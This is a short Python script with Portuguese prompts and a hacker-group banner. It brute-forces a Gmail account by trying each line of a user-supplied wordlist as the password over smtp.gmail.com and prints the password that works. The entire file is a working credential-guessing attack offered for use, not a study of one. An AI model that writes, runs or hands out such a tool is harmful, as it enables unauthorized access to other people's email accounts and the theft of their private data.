#!/usr/bin/python
import smtplib
print("""
+++++++++++++++++++++++++++++
+ SCRIPT FEITO POR SR. ALTO +
+                           +
+    SALVE #HYS TEAM        +
+                           +
+      Versao 1.0           +
+                           +
+ https://github.com/SrAlto +
+++++++++++++++++++++++++++++
                                                                                                                                                                                           
""")
smtps = smtplib.SMTP("smtp.gmail.com", 587)
smtps.ehlo()
smtps.starttls()

user = raw_input("Digite o email: ")
senha = raw_input("Digite o caminho da Wordilist: ")
senha = open(senha, "r")

headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


for password in senha:
    try:
        smtps.login(user, password)
        print("Senha: %s" % password)
        break;
    except smtplib.SMTPAuthenticationError:
        print("Falhou")        
        

